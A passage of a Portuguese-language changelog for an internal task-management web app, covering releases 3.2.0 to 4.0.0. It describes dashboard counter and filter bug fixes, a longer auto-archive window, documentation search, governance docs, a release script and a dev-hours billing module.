  - **Filtros**: período (mês/trimestre/ano/personalizado), status (só aprovadas / todas / rascunhos / rejeitadas), tipo (releases / fases retroativas / todos), busca textual.
  - **Tabela** com colunas: Data, Tipo (Release/Fase), Versão/Fase/Título, Categorias (mini-barras visuais coloridas por categoria), Horas, Custo, Status, Ações (ⓘ explicar / ✎ editar / ✓ aprovar / ↺ reabrir / ✕ excluir).
  - **Modal "ⓘ Como cheguei nessa estimativa"** — exposição RADICAL da metodologia: bucket inicial, razão, ponto-base, multiplicadores aplicados (com label e %), fator total, decomposição em 5 categorias com % de cada, comparação horas-armazenadas vs recalculadas, confiança, taxa horária, custo final. **Tudo inspecionável pelo cliente.**
  - **Modal de edição** — formulário rico com tipo, datas, versão/slug ou fase/commits, título, resumo, bucket, confiança, multiplicadores (checkboxes com %), total de horas (auto-recalc do bucket), taxa horária, perfil de distribuição, decomposição editável manualmente nas 5 categorias, validação de soma (alerta se categorias ≠ total), botão "↻ Sugerir distribuição" que aplica perfil escolhido.

- **Disclaimer permanente** no topo da página: *"Estimativa equivalente, não cronometragem. Valores refletem o tempo que um sr full-stack dev levaria pra entregar o mesmo escopo."* — exigido eticamente quando se cobra de cliente.

- **Item de menu "Horas de Dev"** em Administração (master-only via perm `__master_only__` que ninguém tem; passa o filtro do sidebar pelo `store.isMaster() return true`).

- **Rota `#dev-hours`** registrada com lazy-load em `js/app.js`.

### Why
Esta sessão (3.5.0 → 3.8.0, ~36.5h estimadas / ~R$ 5.475 em ordem de grandeza) foi o gatilho. Pediu-se um sistema que: (a) registre horas e custo por release, (b) permita exposição transparente ao cliente, (c) decomponha o trabalho em categorias significativas pra discussão de escopo, (d) tenha workflow draft→approve pra dev poder revisar antes de oficializar, (e) seja exportável em PDF. A 4.0.0 entrega a fundação executável; releases subsequentes preenchem dados retroativos e adicionam canais de distribuição.

### Decisões de design importantes
1. **Renê + Claude consolidados como autor único** ("sem prompt, eu não trabalho; sem código, prompt vira ar"). Não há split de horas — uma entrada = colaboração total.
2. **R$ 150/h flat** pra ambos. Mercado BR sr full-stack: R$ 120–180; ancorando no meio-alto.
3. **Granularidade híbrida**: releases formais (3.0.0+) viram entradas individuais; fases pré-versionadas (1.x/2.x) viram entradas agregadas com `entryType='phase'` e `phaseCommitsCount`.
4. **Categorias sempre somam o total** (validação na UI). Permite ajuste manual fino mesmo após sugestão automática.
5. **Public link (4.2.0)**: tudo aberto, incluindo R$. Decisão consciente — ferramenta de marketing que mostra velocidade de entrega ao cliente.
6. **Sem detalhamento de quem fez o quê** — cada categoria é colaborativa por natureza no nosso fluxo de trabalho.

### Próximas releases planejadas
- **4.1.0 — Backfill**: agregação retroativa das fases 1.x/2.x (mar/26 → início mai/26, ~600h estimadas) + 8 releases granulares desta sessão (3.5.0 → 3.8.0).
- **4.2.0 — Link público**: `dev-hours-view.html` standalone, sem auth, com mesma tabela e cards (read-only).
- **4.3.0 — PDF export**: padrão `pdfKit.js` (estilo newsletter), capa + tabela paginada + totalizadores + disclaimer ético.

### Verificação manual
1. Master entra em `/Administração/Horas de Dev` — vê página vazia (esperado pré-backfill) com cards zerados.
2. Click "+ Nova entrada" → preenche release de teste → bucket "Médio" + multiplicador "Investigação" → total auto-calc deve ser 2.75h (média 2.75 × 1.30) — wait, fórmula: ponto-base = (1.5+4)/2 = 2.75h × 1.30 = **3.575h** (arredondado a 3.58).
3. "↻ Sugerir distribuição" perfil "Bug fix" → categorias preenchidas em 30/40/15/10/5%.
4. "Salvar" → entrada aparece em rascunho.
5. Modal "ⓘ Como cheguei" → vê explicação completa.
6. Botão ✓ → aprova → entra nos cards de "Aprovadas" e nos totalizadores principais.

---

## [3.8.0+20260505-arquivamento-730d-toggle] — 2026-05-05

Release "Arquivamento alinhado ao escopo de metas". Corrige uma incompatibilidade arquitetural entre o auto-archive de 30 dias e o ciclo de auditoria de metas (anuais e plurianuais). Reportado: *"se eu tenho metas que duram 12 meses, uma tarefa que é arquivada em 30 dias sai do meu escopo de metas, concorda?"* — confirmando o problema e expondo que o help text antigo prometia *"podem ser encontradas com filtros específicos"*, mas esse filtro nunca existiu na UI.

### Changed
- **Threshold de auto-arquivamento: 30 dias → 730 dias (2 anos)**. `js/services/autoArchive.js` linha 12 (`ARCHIVE_AFTER_DAYS`). Justificativa: 730 dias = 2 ciclos anuais completos + buffer pra metas plurianuais (rebranding, transformações). Tarefas só arquivam quando estão claramente fora de qualquer escopo produtivo de auditoria. Ainda preserva o objetivo original do auto-archive (limpar UI de histórico antigo) mas em horizonte que não fere metas.
- **Help text atualizado** (`js/components/helpPanel.js` linhas 75 e 467) para refletir o novo threshold E para apontar para o toggle real. A versão anterior mentia: dizia *"podem ser encontradas com filtros específicos"* — o filtro não existia.

### Added
- **Toggle "📦 Mostrar arquivadas"** no header de filtros do `#tasks` (off por padrão). Quando ON, `applyFilters()` deixa de aplicar `!t.archived`, mostra tarefas arquivadas com badge cinza "📦 Arquivada" no card e o contador "(de N)" passa a incluí-las (com sufixo "incluindo arquivadas"). Persistente durante a sessão da página; reseta ao re-entrar via deep-link.
- **URL param `?archived=1`** para deep-link direto ao filtro com arquivadas visíveis. Útil para auditoria de metas: pode-se construir `#tasks?archived=1&assignee=me&dateFrom=2025-01-01&dateTo=2025-12-31` para ver TUDO que contou pra meta anual de 2025, incluindo tarefas já arquivadas.
- **Botão de migração "🔄 Desarquivar tarefas concluídas há &lt; 730 dias"** em Configurações → Manutenção (master-only). Reaplica retroativamente a regra nova: escaneia todas as tarefas com `archived: true`, recalcula `completedAt vs cutoff(now-730d)`, desarquiva as que entram no novo escopo. Idempotente — pode rodar múltiplas vezes sem efeito colateral. Marca cada tarefa desarquivada com `unarchivedAt: serverTimestamp()` e `unarchivedReason: 'rule_change_730d'` para rastreabilidade. Loga em audit (`auditLog('rule_reapply_unarchive', {unarchived, kept, threshold: 730})`).
- **Badge visual "📦 Arquivada"** no row do task quando `t.archived === true`, com tooltip "Arquivada automaticamente após 730 dias de conclusão".

### Why
Antes: arquivamento e metas tinham horizontes incompatíveis (30d vs 365d+). Tarefas legítimas eram retiradas da UI durante o ciclo produtivo, sem caminho de auditoria. `goals.js` já compensava no cálculo (lê `tasks` ∪ `tasks_archive`), mas a UX de drill-down ("quais tarefas contribuíram pra essa meta?") era impossível. Esta release alinha os dois horizontes E dá saída quando a auditoria precisa olhar além de 730 dias (o toggle).

### Verificação
1. Settings → Manutenção → clicar "🔄 Desarquivar tarefas concluídas há < 730 dias" → confirmar → ver progresso → 179 esperado serem desarquivadas (todas as atuais foram arquivadas em 30d e estão dentro de 730d).
2. Após migração: `#tasks` deve mostrar ~1039 tarefas (todas as ativas — antes mostrava 860).
3. Toggle "📦 Mostrar arquivadas" off → contador limpo "1039 tarefas". Toggle on → "1039 tarefas (incluindo arquivadas)" (zero arquivadas pós-migração).
4. Help panel → busca "auto-arquivamento" → texto reflete 730 dias E aponta para o toggle.

---

## [3.7.2+20260505-fix-contador-arquivadas] — 2026-05-05

Correção do contador "(de N)" no header da lista #tasks. Reportado: *"a diferença de 1039 pra 860 é muito grande, nao acha? e isso fica ainda pior sabendo que temos apenas um setor cadastrado no sistema no momento. de onde vem essa diferença?"*.

### Fixed
- **Denominador "(de N)" incluía tarefas arquivadas que ninguém pode ver**: o label mostrava `860 tarefas (de 1039)` — onde 1039 = `allTasks.length` (RAW, depois do filtro de setor mas ANTES do filtro de archived) e 860 = `filteredTasks` (depois do `!archived` em `applyFilters()`). Diferença de 179 = tarefas arquivadas no sistema. Como **não existe nenhum toggle "mostrar arquivadas"** nesta view (linha 768: `let result = allTasks.filter(t => !t.archived)` é incondicional), o "(de 1039)" exibia um teto que o usuário nunca consegue alcançar — gerando a pergunta legítima "de onde vem essa diferença?".
- **Fix**: `js/pages/tasks.js` linha 883 — denominador agora usa `allTasks.filter(t => !t.archived).length` em vez de `allTasks.length`. Resultado: "(de N)" só aparece quando filtros REAIS (status, prioridade, busca, etc.) estão narrowing, e N representa o que o usuário poderia ver removendo todos os filtros desta tela. Com nenhum filtro ativo, o contador mostra simplesmente "860 tarefas" — sem parêntese confuso.

### Why
Antes da 3.7.1, o "(de N)" raramente saltava aos olhos porque havia múltiplas outras divergências (sector mismatch, filtros persistentes) mascarando o problema. A 3.7.1 fechou essas divergências, expondo o último ponto de confusão: o contador. Ironia: a melhoria revelou um bug latente que sempre esteve lá. Decisão arquitetural — o usuário NUNCA precisa saber a contagem de arquivadas nesta view; se um dia houver toggle "mostrar arquivadas", o denominador volta a `allTasks.length` SOMENTE quando o toggle estiver ativo.

---

## [3.7.1+20260505-fix-painel-filtros-persistentes] — 2026-05-05

Release de correção de **2 bugs distintos** que faziam os números do Meu Painel divergirem da lista após click. Reportado: *"em equipe, aparece 860 tarefas, mas o painel de tarefas fala em 1039 / atrasadas: aparece 3 no card e, ao clicar, nao aparece nenhuma"*. Hipótese certeira do usuário: *"se eu clico em um card, ele filtra no meu user na lista de tarefas, mas se, na sequencia, eu clico em um card da equipe, ele não desabilita meu usuario do filtro para apresentar o global"*.

### Fixed
1. **Filtros do click anterior persistiam ao navegar para `#tasks` sem aquele param** — confirmando a hipótese do usuário. `js/pages/tasks.js` (linhas 112-113) usava:
   ```js
   if (urlAssignee) filterAssignee = urlAssignee;
   if (urlStatus)   filterStatus   = urlStatus;
   ```
   O `if` só sobrescrevia quando a URL trazia valor — quando não trazia, mantinha o estado do click ANTERIOR. Sequência que reproduzia: `#tasks?assignee=me&status=overdue` (3 atrasadas minhas, mostra 0 porque user não tem) → volta dashboard → clica "Tarefas da equipe" (URL `#tasks` puro) → `filterAssignee` continuava `'me'` e `filterStatus` continuava `'overdue'` → lista mostrava só MINHAS+ATRASADAS = 0. **Fix**: assignment incondicional (`filterAssignee = urlAssignee || ''`). URL é fonte da verdade absoluta na entrada da página; se não traz `?assignee=...`, o filtro É vazio.

2. **Inconsistência de filtro de setor entre `fetchTasks` (dashboard) e `subscribeToTasks` (lista)** — bug independente, descoberto investigando o "860 vs 1039". Ambos baixam o mesmo dataset bruto, mas filtravam setores de jeitos diferentes:
   - `fetchTasks` (linha 880): `const visibleSectors = store.getVisibleSectors();` — getter computado: `null` p/ master, `[userSector]` p/ usuário comum com setor único.
   - `subscribeToTasks` (linha 972, anterior): `const visibleSectors = store.get('visibleSectors') || [];` — raw `_state.visibleSectors`, que para usuário comum não-Head é `[]` (vazio).
   - Resultado: condição `if (!isMaster() && visibleSectors.length > 0)` no listener nunca disparava p/ usuário comum → **listener não filtrava por setor** → lista mostrava tarefas de setores que o usuário não deveria enxergar (1039 do sistema todo vs 860 do setor dele no dashboard). Bug latente desde antes da 3.x — ficou exposto agora porque a release 3.7.0 instou comparações sistemáticas entre painel e lista.
   - **Fix**: listener agora usa `store.getVisibleSectors()` com a mesma semântica do `fetchTasks` (`null` = sem filtro, array = restringir a esses setores). Painel e lista passam a operar sobre a mesma base.

### Why
Ambos bugs causavam o mesmo sintoma observável (número do card ≠ número da lista), mas tinham raízes diferentes — corrigir só um teria mantido as discrepâncias visíveis. O caminho de descoberta: a hipótese do usuário (filtro persistente) explicava o "atrasadas 3 → 0", mas não o "860 → 1039" (filtro extra REDUZ, e 1039 > 860). Isso forçou investigar o pipeline de dados e revelou a divergência entre os dois entrypoints.

### Verificação
1. Click "Minhas tarefas" (`?assignee=me`) → click "Atrasadas" da equipe (`?status=overdue` sem assignee) → lista deve mostrar TODAS as atrasadas, não só as minhas.
2. Card "Tarefas da equipe" (`visibleTasks.length`) deve bater EXATAMENTE com o total da lista após click (`#tasks` puro).
3. Para usuário não-master, lista #tasks deve mostrar apenas tarefas dos setores visíveis (não vazar setores alheios).

---

## [3.7.0+20260505-reorganiza-cards-painel] — 2026-05-05

Release "Meu Painel canônico 4+4". Reorganiza os KPIs do painel em duas seções simétricas com 4 cards cada, refletindo exatamente o pedido do usuário: *"Meu desempenho: Minhas tarefas / Atrasadas / Em andamento / Concluídas hoje. Equipe: Tarefas da equipe / Atrasadas / Em andamento / Concluídas hoje"*.

### Changed
- **🎯 Meu desempenho** — 4 cards canônicos, sempre na mesma ordem:
  1. **Minhas tarefas** (`myTasks.length`) → `#tasks?assignee=me`
  2. **Atrasadas** (status virtual `overdue` aplicado em `myActive`) → `#tasks?assignee=me&status=overdue`
  3. **Em andamento** (`myInProgress`) → `#tasks?assignee=me&status=in_progress`
  4. **Concluídas hoje** (`myDoneToday`) → `#tasks?assignee=me&completedToday=1`
- **🏢 Equipe / Setor** (mostrado só se `visibleTasks > myTasks` — analista solo não vê) — espelha a seção pessoal:
  1. **Tarefas da equipe** (`visibleTasks.length`) → `#tasks`
  2. **Atrasadas** (`teamOverdue`) → `#tasks?status=overdue`
  3. **Em andamento** (`teamInProgress`) → `#tasks?status=in_progress`
  4. **Concluídas hoje** (`teamDoneToday`) → `#tasks?completedToday=1`
- **Removidos dos KPIs principais** "Observando" e "Parcerias ativas" (informação ainda acessível na lista #tasks via `?observer=me` / `?partnership=1` + nos atalhos do menu). Razão: poluíam visualmente a grade 4+4 e raramente eram usados como entrada — usuários iam direto pra lista.
- Renomeado "Concluí Hoje" → "Concluídas hoje" (paralelismo com "Em andamento", consistência tipográfica).

### Fixed
- **Filtro "Últimos 30 dias" não desabilitava com `?assignee=me` puro**: ao clicar o card "Minhas tarefas" (sem outros filtros), o preset default de 30 dias era aplicado e ocultava tarefas mais antigas → número da lista < número do card. Agora `filterDatePreset` é desabilitado quando QUALQUER filtro vem da URL (`assignee`, `status`, `projectId`, `workspaceId`, `observer`, `open`, `completedToday`, `partnership`) — o card abre a visão completa correspondente.

---

## [3.6.1+20260505-fix-buraco-painel] — 2026-05-05

### Fixed
- **"Buraco" branco à direita dos cards** no Meu Painel (regressão da 3.6.0). Reportado: *"esse buraco em branco que ficou na página, ao lado desses cards?"*. Causa: o `#dash-stats` era um único grid `auto-fit, minmax(200px, 1fr)`, e os labels de seção (`grid-column:1/-1`) coexistiam com os cards no mesmo grid. CSS computava 6 colunas implícitas (largura ÷ 200px), mas com 3 cards numa seção, as 3 colunas finais ficavam vazias — `auto-fit` **não colapsa colunas vazias quando elas estão no fim de uma row já parcialmente ocupada** (limitação da spec). Resultado visual: 3 cards de 201px cada à esquerda + ~380px de espaço morto à direita.
- **Fix**: `#dash-stats` virou `display:flex; flex-direction:column`. Cada seção (label + cards) é renderizada separadamente: label como filho direto do flex, cards agrupados num `<div class="dash-stats-row">` com seu próprio grid `auto-fit, minmax(220px, 1fr)`. Como cada row de cards é um grid INDEPENDENTE, com 3 cards `auto-fit` colapsa as colunas extras corretamente — cards ocupam 100% da largura disponível, distribuídos igualmente.
- Detectado em teste in-browser via `getComputedStyle`: antes mostrava `gridTemplateColumns: "201px 201px 201px 201px 201px 201px"` (6 col fixas, 3 vazias); depois fica como `auto-fit` honrando a contagem real de cards.

---

## [3.6.0+20260505-refactor-meu-painel] — 2026-05-05

Release "Meu Painel coerente". Refatora o dashboard pessoal corrigindo **4 inconsistências** entre o que os cards mostravam e o que aparecia ao clicar — discrepâncias que foram reportadas em uso real ("clico em Em Andamento: 48, vejo 3").

### Fixed (4 bugs distintos)
1. **Cards do KPI somavam de bases diferentes** (3.5.x e anteriores):
   - "Em Andamento: **48**" usava `visibleTasks.filter(...)` (TODAS visíveis no sistema), mas o click levava pra `?assignee=me&status=in_progress` que filtra só **minhas** → divergência.
   - "Concluídas Hoje: **40**" usava `tasks.filter(...)` (TUDO no sistema, sem nem filtro de visibility), click levava pra `?assignee=me&completedToday=1` → 0.
   - **Fix**: cards de KPI pessoal agora usam **estritamente** `myTasks = visibleTasks.filter(t => t.assignees.includes(uid))` — mesmo critério que o filtro `?assignee=me` em `tasks.js`. Número do card = número da lista após click.
2. **`archived` não filtrado no painel** (mas filtrado em `#tasks`): "Minhas Abertas: **4**" no card vs **3** na lista após click. Causa: a lista `applyFilters()` em tasks.js filtra `!t.archived` (linha 755) mas o painel não fazia. **Fix**: `baseTasks = tasks.filter(t => !t.archived)` aplicado consistentemente em todos os cálculos.
3. **"Distribuição" usava status inexistente `'todo'`** — sempre mostrava 0 em "A Fazer". O status real é `'not_started'`. **Fix**: substituído pelos 5 status canônicos (`not_started`, `in_progress`, `review`, `rework`, `done`) + agora exibe SÓ minhas tarefas (renomeado para "Minha distribuição"). Cada barra é clicável → leva pro filtro correspondente.
4. **Card "Projetos Ativos: 14"** não fazia sentido no painel pessoal — eram TODOS os projetos do sistema. **Fix**: removido dos KPIs e substituído por **"Meus Projetos"** que filtra: (a) projetos onde sou member, (b) onde criei, (c) onde tenho tarefa atribuída. Progress bar mostra `dones/total` das **minhas** tarefas no projeto, não do projeto inteiro.

### Changed
- **Reorganização em 2 seções claras** com label de seção explícito:
  - **🎯 Meu desempenho**: Minhas Abertas · Em Andamento · ⚠ Atrasadas (se houver) · Concluí Hoje · Observando (se houver) · Parcerias (se houver). Todos os números refletem ESTRITAMENTE minhas tarefas (assignee=me).
  - **🏢 Equipe / Setor** (mostrado só se `visibleTasks > myTasks` — analista solo não vê): Equipe Em Andamento · Equipe Atrasadas (se houver) · Equipe Concluiu Hoje. Click leva pra `#tasks` SEM `assignee=me` — visão de capacidade do time.
- **"Concluídas Hoje" → "Concluí Hoje"**: nomenclatura mais clara de propriedade pessoal.
- Removido card global "Status distribution" com bug do `'todo'`. Substituído por "Minha distribuição" (cards clicáveis levam ao filtro de status correspondente).
- Cards de Squads/Metas/Projetos agora filtram `archived` consistentemente.
- Squads cards viraram `<a>` clicáveis levando pra `#tasks?workspaceId=<id>` (era `<div>` estático).

### Added
- Definição canônica de **"minhas tarefas"** documentada em `RULES-AND-AUTOMATIONS.md` § 10.1:
  - **Estrita** (`?assignee=me`, KPIs do "Meu desempenho"): `t.assignees.includes(uid)`
  - **Observada** (`?observer=me`): `t.observers.includes(uid) && !t.assignees.includes(uid)` (excluindo quem é assignee+observer pra não inflar)
  - **Filtro `archived`**: TODAS as views filtram `!t.archived` por padrão (consistência painel ↔ lista)
  - **"Da equipe/setor"**: `visibleTasks` (todas que o user enxerga), exibidas em seção separada

### Why
Reportado pelo product owner: *"Os números nos cards não fazem sentido. Clico em 'Em Andamento (48)' e vejo 3. 'Concluídas Hoje (40)' → 0."* A causa raiz era arquitetural — o painel foi escrito incremental sem definição canônica de "minhas tarefas", então cada card calculava em base diferente. A reformulação cumpre o que o nome promete: "Meu Painel" é sobre **mim**, com seção opcional pra quem precisa visão de equipe.

---

## [3.5.1+20260505-fix-pickers-deeplink-sync] — 2026-05-05

### Fixed
- **Pickers visuais da toolbar `#tasks` não refletiam filtros vindos via URL hash** (regressão da 3.5.0). Cenário: user clica em "Minhas Abertas" no Meu Painel → vai pra `#tasks?assignee=me&open=1` → lista filtrava corretamente (4 de 1039 tarefas), mas o picker visual mostrava "Todos os responsáveis" em vez de "Renê Castro". Causa: `<option>` do `<select hidden>` era renderizada sem `selected`, fazendo o `select.value` ser `''` no momento do `bindOptionPicker` sync inicial. Fix: aplicar `selected` baseado no estado `filterX` na geração das `<option>`s + chamar `renderPickerButton` já com o `selected` correto computado em tempo de render do HTML inicial. Aplicado para `filter-status`, `filter-priority`, `filter-assignee`. Funcionalmente o filtro sempre funcionou — só o visual estava dessincronizado.

### Why
Bug detectado em **teste in-browser real** após deploy da 3.5.0. Reforça por que toda mudança UX precisa ser testada in-browser antes do release, não só `node --check`. Gap de processo registrado para corrigir.

---

## [3.5.0+20260505-status-atrasada-datepicker-search-meu-painel] — 2026-05-05

Release "Quick Wins UX". 4 melhorias pontuais que vinham gerando atrito:

### Added
- **Status virtual "⚠ Atrasada"** em tarefas — derivado de `dueDate < hoje && status !== done && !== cancelled`. Não é campo persistido (estado temporal). Aparece como:
  - **Coluna no kanban** (groupBy=status), vermelha, no início do board. Tarefa atrasada some da coluna do status real (não duplica).
  - **Opção no filtro de status** da toolbar `#tasks` (com mesmo visual e cor).
  - **Picker visual** unificado com bolinha vermelha + ícone ⚠.
  - Helper canônico `isTaskOverdue(t)` exportado de `js/services/tasks.js`.
  - Comportamento documentado em `RULES-AND-AUTOMATIONS.md` § 10.1 com racional ("por que virtual e não persistido").
- **`js/components/datepickerEnhance.js`** — input `type="date"` agora abre o calendário ao clicar em **qualquer parte** do input (não só no ícone). Usa `showPicker()` API (Chrome 99+, Edge 99+, Safari 16+, Firefox 101+) com fallback gracioso pra browsers antigos. Helper genérico aplicável a `date / datetime-local / month / time / week`. Hookado no `taskModal` no setup do modal.
- **CSS global** em `css/portal.css`: `cursor:pointer` em todos os inputs de data + hover state no `::-webkit-calendar-picker-indicator`.
- **Search inline** nos pickers de Responsáveis e Observadores no modal de tarefa. Ao abrir o dropdown, foco automático na barra de busca; lista filtra em real-time conforme digita; "Nenhum resultado" quando zera.
- **Deep-link com filtros** na página `#tasks` via query string da URL hash:
  - `?assignee=me|<uid>` · `?observer=me|<uid>` · `?status=in_progress|overdue|...` · `?open=1` · `?completedToday=1` · `?partnership=1` · `?projectId=<id>` · `?workspaceId=<id>`
  - Combinados em AND.
  - Quando deep-link traz filtro temporal próprio (`open`/`completedToday`/`partnership`/`observer`), o preset default "Últimos 30 dias" é desabilitado para mostrar a categoria completa.
  - Atualização canônica em `RULES-AND-AUTOMATIONS.md` § 10.1.

### Changed
- **Meu Painel (`#dashboard`)**: cada KPI card agora linka pra `#tasks` com **filtro pré-aplicado** específico:
  - "Minhas Abertas" → `?assignee=me&open=1`
  - "Em Andamento" → `?assignee=me&status=in_progress`
  - "Concluídas Hoje" → `?assignee=me&completedToday=1`
  - "Observando" → `?observer=me`
  - "Parcerias ativas" → `?assignee=me&partnership=1`
  - Antes: todos apontavam pra `#tasks` cru e o user via lista completa, perdendo contexto do KPI clicado.

### Fixed
- Status virtual "Atrasada" resolve UX crítica: antes não havia visão consolidada de tarefas com prazo vencido — user precisava abrir o filtro de prazo e escolher "⚠ Atrasadas" manualmente. Agora aparece destacada no kanban e no filtro de status, casando com a expectativa natural ("Atrasada é um estado").

### Why
4 demandas concretas reportadas pelo product owner. Cada uma resolve atrito específico:
1. "Falta status Atrasado" — visibilidade imediata de prazos vencidos
2. "Datepicker não abre clicando no campo" — em browsers modernos `<input type="date">` só abre no clique do indicator (canto direito); UX confusa
3. "Não tem busca inline em responsáveis/observadores" — listas longas (20+ pessoas) sem filtro = scroll/leitura linear pra achar alguém
4. "Cards do Meu Painel mostram TODAS as tarefas, não filtradas" — dead-end de contexto: user clica no KPI específico e perde a categoria

---

## [3.4.0+20260505-regras-e-search-docs] — 2026-05-05

Release "Auditoria de Regras + Search". Documenta de forma completa todas as regras automáticas que o sistema aplica vinculadas a hierarquia/permissões/módulos, com **racional** explicando cada decisão. Adiciona search global na página pública de documentação.

### Added
- **`RULES-AND-AUTOMATIONS.md`** (novo, ~400 linhas) — mapa completo das regras automáticas, com **racional**:
  1. **Hierarquia de papéis** com porquê de cada nível
  2. **Permissions × roles** (tabela canônica) com racional de quem ganhou cada permissão
  3. **Visibility scopes** (own / sector / squad / all) — quem vê o quê e por quê
  4. **Auto-provisioning de usuários SSO** — allowlist de domínio, defaults, sync `nucleos→squads`, notificação a masters
  5. **Defaults automáticos** por módulo (tasks, goals, calendário, projetos, feedbacks)
  6. **Cascatas e syncs** (núcleos↔squads, tipo→variação→SLA, setor→tipo, re-bind de UID em SSO consolidation)
  7. **Notificações automáticas** — quem recebe quando, regras de roteamento, self-suppression, cron schedule
  8. **Validações server-side** (Firestore Rules) — defense-in-depth
  9. **Auditoria automática** — o que é logado sem ação explícita (~13 eventos)
  10. **Regras por módulo** com racional (Tarefas, Goals, Feedbacks, CSAT, Calendário, IA Hub, Auditoria, Squads, Time Clock, LGPD)
- **Entrada `⚖ Regras & Automações`** no menu de `docs.html` (seção Segurança).
- **Link direto da página `#roles`** (Configurações → Roles e Permissões) para o doc novo: "📖 Ver documento técnico de Regras & Automações" no banner de info.
- **Cross-link em `ACCESS-CONTROL.md`** apontando pro novo doc.
- **Search global em `docs.html`**:
  - Pré-fetch de todos os 18 MDs em paralelo após render do doc atual (não-bloqueante, ~200ms)
  - Cache em memória com texto raw + lowercase pra busca rápida
  - Input no topo da sidebar com placeholder "Buscar nos documentos…", ícone 🔍 e botão de limpar (✕)
  - Status indicator durante indexação ("⏳ Indexando 5/18…" → "✓ 18 documentos indexados")
  - Resultados renderizados como cards clicáveis com snippet de ±60 chars contextual ao redor da 1ª ocorrência, com `<mark>` highlighting
  - Boost para hit no título do doc (vai pro topo)
  - Top 30 resultados, sort por score
  - Atalho `Esc` limpa search e restaura conteúdo
  - Nav lateral marca docs com hit (border esquerda dourada)
  - "Search empty" estado quando nenhum match

### Why
A demanda do time de TI/auditoria foi explícita: precisamos de um lugar único onde estejam escritas todas as regras vinculadas a hierarquia e módulos, com **racional** ("o porquê", não só "o que"). E com o acervo de docs crescendo (~18 docs agora), busca por título de menu não é mais suficiente — search por conteúdo vira essencial.

### Mudanças menores
- `docs.html` topbar e sidebar.subtitle ganharam ajustes de margin pra acomodar o search.

---

## [3.3.0+20260505-fix-icones-e-release-script] — 2026-05-05

### Added
- **`scripts/release.sh`** — automatiza bump de versão com 1 comando:
  ```bash
  ./scripts/release.sh patch fix-icones-projeto
  ./scripts/release.sh minor pickers-multiinstance
  ./scripts/release.sh major schema-multitenancy
  ./scripts/release.sh build hotfix-cache  # mantém X.Y.Z, só atualiza BUILD
  ```
  Atualiza atomicamente `js/version.js` + `index.html` (`?v=...` cache-bust) + adiciona seção placeholder em `CHANGELOG.md`. Não commita — você revisa, edita o CHANGELOG e commita manualmente.
- **Regra dura em `docs/VERSIONING.md`**: todo push pra `main` (= deploy automático no GitHub Pages) bumpa pelo menos o BUILD. Não pode haver desalinhamento entre código rodando e versão declarada — telemetria, suporte e rollback dependem disso.

### Fixed
- **Ícones de projeto não apareciam no picker** do modal de tarefa. Causa: `lookupProject(id)` chamava `store.get('projects')`, mas `store.set('projects', …)` nunca é executado em lugar nenhum no app — sempre retornava `undefined`, caindo num fallback que extraía o ícone via regex `/^(\S)\s/`. A regex falhava para emojis multi-byte (surrogate pairs como 🚀, 🎯) capturando só metade do code point e gerando glifo quebrado.
  - **Fix**: cache local `_currentProjects` no módulo `taskModal.js`, populado em `buildHTML(projects)`. Lookup primário usa esse cache; fallback agora usa `splitEmoji`-style (`codePointAt(0) > 127` + `split(/\s+/)`) compatível com emojis multi-byte.

### Known follow-ups (próximas releases)
- **Visual da lista de metas** (taskModal modal `🎯 Vincular metas` + overlay de tarefa concluída): 4 selects nativos (escopo / responsável / gestor / squad) ainda não migrados pra `optionPicker`. Migração planejada para próxima rodada — exige cuidado pois é multi-instance dentro do mesmo modal.
- **Acordeão de metas colapsado por default**: similar ao type-picker do modal de tarefa (já colapsado), aplicar comportamento ao agrupamento setor → goal → pilar do picker de metas.

---

## [3.2.2+20260505-pci-scope] — 2026-05-05

### Added
- **`GOVERNANCE.md` § 7.3 "Frameworks que NÃO se aplicam (e por quê)"** — declaração explícita de não-aplicabilidade de PCI DSS, HIPAA, PCI 3DS, FedRAMP e SOX, com justificativa técnica para cada. PCI DSS recebe explicação detalhada (sistema não armazena/processa/transmite dados de cartão; pagamentos vivem em sistemas segregados da operação PRIMETOUR). Antecipa pergunta clássica de auditoria externa e demonstra que o escopo do produto foi pensado deliberadamente para minimizar superfície regulatória.
- **Política de revisão** anexa: a cada release MAJOR, o time revisa se algum framework declarado como não-aplicável passou a aplicar (ex: se um dia houver feature de pagamento, PCI sai desta seção e entra em 7.1 com plano de conformidade).

---

## [3.2.1+20260505-backbtn] — 2026-05-05

### Fixed
- **Botão "Voltar" adaptativo** em `docs.html` resolve dead-end de UX para auditores externos. Antes: botão sempre apontava pra `/tarefas/` (app interno com login obrigatório), levando especialistas externos a uma tela de login que não conseguem usar. Agora:
  - **Default** (sem sessão Firebase): botão exibe `🌐 primetour.com.br` e abre o site institucional em nova aba.
  - **Com sessão** (interno autenticado): lazy-load do Firebase Auth detecta `currentUser` em até 2s e atualiza o botão para `← Voltar ao Gestor PRIMETOUR` apontando direto pro app, com tooltip mostrando o email logado.
- Implementação não-bloqueante: docs renderizam imediatamente; auth check roda em paralelo. Se Firebase indisponível ou config bloqueada, mantém o botão default ("externo") como fallback seguro.

---

## [3.2.0+20260505-governance] — 2026-05-05

Release "Auditoria-Ready". Endurece a documentação para revisão por especialistas TI externos: cria doc de governança (faltava no acervo), saneia exposições no SECURITY.md, alinha ACCESS-CONTROL com squads unificados, atualiza INFRA com referências a docs irmãos.

### Added
- **`GOVERNANCE.md`** (novo, ~250 linhas) — política completa de governança técnica e de dados:
  - Modelo de papéis e responsabilidades (Sponsor, Tech Lead, DPO, Incident Commander, Admin, Auditor)
  - Comitês e cadências (review de Segurança mensal, Acessos trimestral, Fornecedores trimestral, Pentest anual)
  - Ciclo de vida de mudança (versionamento, pipeline de deploy, janelas de manutenção)
  - Gestão de fornecedores (críticos vs não-críticos, política de troca)
  - Política de retenção de dados (7 categorias com período + justificativa legal)
  - Classificação de dados (Pública / Interna / Confidencial / Restrita)
  - Direitos do titular LGPD (mapeamento de Art. 18 → endpoints)
  - Risk register (8 riscos identificados com tratamento)
  - Backup & DR (RTO 4h, RPO 1h)
  - Compliance mapping (LGPD ✓, SOC 2 artefatos prontos, ISO 27001 mapeado, GDPR equivalente)
  - Política de uso de IA com dados de cliente (no-training, metadados-only em logs)
- Entrada nova no menu de `docs.html`: **Governança** (seção própria, primeira da lista, default ao abrir docs)
- Cabeçalho de aviso "Esta página é pública" em SECURITY.md e INFRA.md com link pro DPO

### Changed
- **`SECURITY.md` saneado** para auditoria externa:
  - Removidos prefixos de chaves vazadas mencionadas no histórico (eram detalhes operacionais internos com info sensível)
